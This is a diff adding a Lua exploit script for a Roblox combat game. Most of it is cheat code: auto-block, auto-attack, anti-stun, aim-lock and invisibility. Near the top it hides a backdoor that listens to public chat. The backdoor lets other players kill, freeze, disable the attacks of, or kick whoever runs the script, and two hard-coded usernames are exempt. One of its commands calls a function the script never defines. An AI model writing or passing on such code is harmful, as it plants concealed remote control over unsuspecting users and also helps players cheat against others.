@@ -1,0 +1,389 @@
+getgenv().JumperConfig = getgenv().JumperConfig or {
+    AutoBlock = false,
+    AutoBlockStart = 0.1,
+    AutoBlockEnd = 0.3,
+    AutoBlockRange = 20,
+    AutoPunish = false,
+    AutoPunishRange = 20,
+    AntiM1 = false,
+    AntiM1Range = 20,
+    LookAt = false,
+    LookAtSmoothness = 0.15,
+    Invisibility = false
+}
+
+local cfg = getgenv().JumperConfig
+
+local vu9 = game:GetService("Players")
+local v10 = game:GetService("TextChatService")
+local vu11 = vu9.LocalPlayer
+local vu12 = vu11.Character or vu11.CharacterAdded:Wait()
+local vu13 = {
+    "skibidislume007",
+    "hashtag_hashtagcoma3"
+}
+
+vu11.CharacterAdded:Connect(function(p14)
+    vu12 = p14
+end)
+
+local function vu17()
+    if vu12 and vu12:FindFirstChild("HumanoidRootPart") then
+        local v15 = vu12.HumanoidRootPart
+        local v16 = workspace.Map.Model.Barriers:FindFirstChild("AntiStuckInVoid")
+        if v16 then
+            firetouchinterest(v15, v16, 0)
+            task.wait(0.1)
+            firetouchinterest(v15, v16, 1)
+        end
+    end
+end
+
+local function vu24(p18)
+    if vu12 then
+        local v19 = vu12
+        for _, v23 in ipairs(v19:GetChildren()) do
+            if v23:IsA("BasePart") then
+                v23.Anchored = p18
+            end
+        end
+    end
+end
+
+local function vu29()
+    for _, v28 in ipairs(vu13) do
+        if vu11.Name == v28 then
+            return true
+        end
+    end
+    return false
+end
+
+local vu30 = getrawmetatable(game)
+setreadonly(vu30, false)
+local vu31 = vu30.__namecall
+setreadonly(vu30, true)
+
+function noattack()
+    setreadonly(vu30, false)
+    function vu30.__namecall(p32, ...)
+        if getnamecallmethod() ~= "FireServer" or p32.Name ~= "AttackInput" then
+            return vu31(p32, ...)
+        else
+            return nil
+        end
+    end
+    setreadonly(vu30, true)
+end
+
+function attack()
+    setreadonly(vu30, false)
+    vu30.__namecall = vu31
+    setreadonly(vu30, true)
+end
+
+v10:WaitForChild("TextChannels"):WaitForChild("RBXGeneral").MessageReceived:Connect(function(p33)
+    if p33.TextSource and p33.TextSource.UserId ~= vu11.UserId then
+        if vu29() then
+            return
+        end
+        local v34 = p33.Text:lower()
+        if v34 == "!kill" then
+            vu17()
+        elseif v34 == "!freeze" then
+            vu24(true)
+        elseif v34 == "!unfreeze" then
+            vu24(false)
+        elseif v34 == "!noattack" then
+            noattack()
+        elseif v34 == "!yesattack" then
+            attack()
+        elseif v34 == "!speedup" then
+            speedup()
+        elseif v34 == "!kick" then
+            vu11:Kick("sybau boi")
+        end
+    end
+end)
+
+local v185 = game:GetService("RunService")
+local v186 = game:GetService("ReplicatedStorage")
+local vu187 = game:GetService("Stats")
+local vu188 = vu9.LocalPlayer
+local vu189 = vu188:WaitForChild("Remotes"):WaitForChild("Combat"):WaitForChild("AttackInput")
+local v190 = v186:WaitForChild("Animations"):WaitForChild("Attacks")
+
+local vu199 = {}
+local vu200 = false
+local vu470 = {}
+
+for _, folder in ipairs(v190:GetChildren()) do
+    if folder.Name ~= "Backdash" and folder.Name ~= "Sidedash" and folder.Name ~= "Block" then
+        for _, anim in ipairs(folder:GetDescendants()) do
+            if anim:IsA("Animation") then
+                vu470[anim.AnimationId] = true
+            end
+        end
+    end
+end
+
+local v191 = v190:WaitForChild("Global"):WaitForChild("M1")
+for _, v204 in ipairs(v191:GetDescendants()) do
+    if v204:IsA("Animation") then
+        vu199[v204.AnimationId] = true
+    end
+end
+
+local function vu205()
+    if vu200 then
+        vu189:FireServer("Block", false)
+        vu200 = false
+    end
+end
+
+local function vu227()
+    local v206 = vu188.Character
+    if not v206 then
+        return nil
+    end
+    local v207 = v206:FindFirstChild("HumanoidRootPart")
+    if not v207 then
+        return nil
+    end
+    local v208 = cfg.AutoBlockRange
+    local v213 = nil
+    for _, v214 in ipairs(vu9:GetPlayers()) do
+        if v214 ~= vu188 then
+            local v215 = v214.Character
+            local v216 = v215 and v215:FindFirstChild("HumanoidRootPart")
+            if v216 then
+                local v217 = (v207.Position - v216.Position).Magnitude
+                if v217 < v208 then
+                    local v218 = v215:FindFirstChildOfClass("Humanoid")
+                    if v218 then
+                        for _, v222 in ipairs(v218:GetPlayingAnimationTracks()) do
+                            if vu199[v222.Animation.AnimationId] then
+                                v213 = v214
+                                v208 = v217
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return v213
+end
+
+local function vu471()
+    local v206 = vu188.Character
+    if not v206 then
+        return nil
+    end
+    local v207 = v206:FindFirstChild("HumanoidRootPart")
+    if not v207 then
+        return nil
+    end
+    local v208 = cfg.AutoPunishRange
+    local v213 = nil
+    for _, v214 in ipairs(vu9:GetPlayers()) do
+        if v214 ~= vu188 then
+            local v215 = v214.Character
+            local v216 = v215 and v215:FindFirstChild("HumanoidRootPart")
+            if v216 then
+                local v217 = (v207.Position - v216.Position).Magnitude
+                if v217 < v208 then
+                    local v218 = v215:FindFirstChildOfClass("Humanoid")
+                    if v218 then
+                        for _, v222 in ipairs(v218:GetPlayingAnimationTracks()) do
+                            if vu470[v222.Animation.AnimationId] then
+                                v213 = v214
+                                v208 = v217
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return v213
+end
+
+local function vu474()
+    local v206 = vu188.Character
+    if not v206 then
+        return nil
+    end
+    local v207 = v206:FindFirstChild("HumanoidRootPart")
+    if not v207 then
+        return nil
+    end
+    local v208 = cfg.AntiM1Range
+    local v213 = nil
+    for _, v214 in ipairs(vu9:GetPlayers()) do
+        if v214 ~= vu188 then
+            local v215 = v214.Character
+            local v216 = v215 and v215:FindFirstChild("HumanoidRootPart")
+            if v216 then
+                local v217 = (v207.Position - v216.Position).Magnitude
+                if v217 < v208 then
+                    local v218 = v215:FindFirstChildOfClass("Humanoid")
+                    if v218 then
+                        for _, v222 in ipairs(v218:GetPlayingAnimationTracks()) do
+                            if vu199[v222.Animation.AnimationId] then
+                                v213 = v214
+                                v208 = v217
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return v213
+end
+
+local vu472 = false
+local vu475 = nil
+
+v185.Heartbeat:Connect(function()
+    if cfg.AutoBlock then
+        local v229 = vu227()
+        if v229 and not vu200 then
+            vu200 = true
+            local v230 = cfg.AutoBlockStart + vu187.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 / 2
+            task.delay(v230, function()
+                if vu200 then
+                    vu189:FireServer("Block", true)
+                    task.delay(cfg.AutoBlockEnd, function()
+                        if vu200 then
+                            vu189:FireServer("Block", false)
+                            vu200 = false
+                        end
+                    end)
+                end
+            end)
+        end
+    else
+        vu205()
+    end
+    
+    if cfg.AutoPunish then
+        local v473 = vu471()
+        if v473 and not vu472 then
+            vu472 = true
+            task.spawn(function()
+                for i = 1, 4 do
+                    vu189:FireServer("M1", true)
+                    task.wait(0.05)
+                end
+                vu189:FireServer("M1", false)
+                task.wait(1)
+                vu472 = false
+            end)
+        end
+    end
+    
+    if cfg.LookAt then
+        local v476 = vu227()
+        if v476 and v476.Character then
+            local v477 = v476.Character:FindFirstChild("HumanoidRootPart")
+            local v478 = vu188.Character
+            if v478 then
+                v478 = v478:FindFirstChild("HumanoidRootPart")
+            end
+            if v477 and v478 then
+                local v479 = v477.Position
+                local v480 = v478.Position
+                local v481 = Vector3.new(v479.X, v480.Y, v479.Z)
+                local v482 = CFrame.new(v480, v481)
+                v478.CFrame = v478.CFrame:Lerp(v482, cfg.LookAtSmoothness)
+            end
+        end
+    end
+end)
+
+v185.Heartbeat:Connect(function()
+    if cfg.AntiM1 then
+        local v483 = vu474()
+        if v483 then
+            local v410 = vu188.PlayerGui.StatesHolder.States
+            v410:SetAttribute("Stunned", false)
+        end
+    end
+end)
+
+local v281 = game:GetService("Players")
+local vu282 = game:GetService("RunService")
+local v283 = v281.LocalPlayer
+local vu285 = {}
+local vu286 = nil
+local vu287 = {
+    "Head",
+    "Torso",
+    "Left Arm",
+    "Right Arm",
+    "Left Leg",
+    "Right Leg"
+}
+
+local function vu295(p288, p289)
+    for _, v293 in ipairs(vu287) do
+        local v294 = p289:FindFirstChild(v293)
+        if v294 and v294:IsA("BasePart") then
+            v294.Transparency = p288
+        end
+    end
+end
+
+local function vu300()
+    for _, v299 in pairs(vu285) do
+        if v299 then
+            v299:Disconnect()
+        end
+    end
+    vu285 = {}
+    if vu286 and vu286.IsPlaying then
+        vu286:Stop()
+    end
+end
+
+local function vu305(p301)
+    vu300()
+    local v302 = p301:WaitForChild("Humanoid")
+    local v303 = v302:FindFirstChildOfClass("Animator") or Instance.new("Animator", v302)
+    local v304 = Instance.new("Animation")
+    v304.AnimationId = "rbxassetid://83555998356899"
+    vu286 = v303:LoadAnimation(v304)
+    vu286.Priority = Enum.AnimationPriority.Action4
+    if cfg.Invisibility then
+        vu295(0.5, p301)
+        table.insert(vu285, vu282.Heartbeat:Connect(function()
+            if not vu286.IsPlaying then
+                vu286:Play()
+            end
+            vu286:AdjustSpeed(0)
+            vu286.TimePosition = 10
+        end))
+        table.insert(vu285, vu282.RenderStepped:Connect(function()
+            if vu286.IsPlaying then
+                vu286:Stop()
+            end
+        end))
+    else
+        vu295(0, p301)
+    end
+end
+
+v283.CharacterAdded:Connect(function(p306)
+    p306:WaitForChild("HumanoidRootPart")
+    vu300()
+    vu305(p306)
+end)
+
+if v283.Character then
+    vu305(v283.Character)
+end
